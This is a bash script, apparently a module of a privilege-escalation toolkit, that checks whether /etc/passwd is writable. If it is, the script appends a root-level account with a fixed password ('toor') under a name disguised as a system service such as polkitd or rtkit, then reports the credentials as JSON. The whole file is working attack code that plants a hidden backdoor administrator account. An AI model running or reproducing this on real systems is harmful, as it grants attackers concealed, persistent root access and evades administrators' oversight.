#!/bin/bash
source "$(dirname "$0")/00_common.sh"
METHOD="writable_passwd"
info "Checking /etc/passwd writability..."
if [ -w /etc/passwd ]; then
    # Generate password hash for 'toor'
    hash='$6$xyz$LH7.KtyD1dQJwJx8RDBR8DYR7XH0xJmLF9jgK3OE.jqxrAhFGIxj7CFDgPcXS7B6sNqBFJ5bVhqhHO5sCZ7qS1'
    # Pick camouflage name
    for name in "systemd-coredump" "polkitd" "rtkit" "_apt" "nm-openvpn"; do
        id "$name" &>/dev/null || { echo "$name:$hash:0:0::/root:/bin/bash" >> /etc/passwd 2>/dev/null && { result_json "$METHOD" "success" "$name:toor" ""; exit 0; }; }
    done
fi
[ -w /etc/shadow ] && { result_json "$METHOD" "partial" "/etc/shadow writable" ""; exit 0; }
result_json "$METHOD" "fail" "Not writable"; exit 1
